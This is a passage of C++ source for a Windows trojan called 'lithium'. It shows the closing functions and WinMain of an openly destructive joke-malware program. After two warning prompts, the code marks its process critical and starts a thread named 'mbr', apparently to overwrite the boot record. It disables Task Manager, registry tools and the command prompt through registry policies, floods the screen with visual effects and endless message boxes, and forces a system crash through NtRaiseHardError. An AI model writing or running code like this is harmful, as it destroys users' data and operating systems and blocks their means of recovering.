	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI msg(LPVOID lpParam) {
	while (true) {
		MessageBox(NULL, L"", L"lithium", MB_ICONERROR);
	}
	return 0;
}

DWORD WINAPI msg1(LPVOID lpParam) {
	while (true) {
		MessageBox(NULL, L"your PC is destroyed HAHAHAHA!", NULL, MB_ICONWARNING);
	}
	return 0;
}

DWORD WINAPI msg2(LPVOID lpParam) {
	while (true) {
		MessageBox(NULL, L"dead end!", L"AAAAAA!", MB_ICONASTERISK);
	}
	return 0;
}

DWORD WINAPI winmove(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		SetWindowPos(GetForegroundWindow(), 0, rand() % w, rand() % h, rand() % w, rand() % h, 0);
		Sleep(500);
		ReleaseDC(0, hdc);
	}
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
	if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as lithium that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"lithium", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	}
	else {
		if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"lithium", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			ProcessIsCritical();
			CreateThread(0, 0, mbr, 0, 0, 0);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			Sleep(4000);
			CreateThread(0, 0, msg, 0, 0, 0);
			Sleep(1000);
			CreateThread(0, 0, winmove, 0, 0, 0);
			HANDLE thread1 = CreateThread(0, 0, rndblt, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, stretch, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			TerminateThread(thread1dot1, 0);
			CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread2 = CreateThread(0, 0, white, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			CreateThread(0, 0, msg1, 0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread3dot1 = CreateThread(0, 0, laplace, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			TerminateThread(thread3dot1, 0);
			CloseHandle(thread3dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread4 = CreateThread(0, 0, shader2, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread5 = CreateThread(0, 0, shader3, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			CreateThread(0, 0, msg2, 0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, shader4, 0, 0, 0);
			HANDLE thread6dot1 = CreateThread(0, 0, piez, 0, 0, 0);
			HANDLE thread6dot2 = CreateThread(0, 0, textout, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread7 = CreateThread(0, 0, shader5, 0, 0, 0);
			sound7();
			Sleep(30000);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}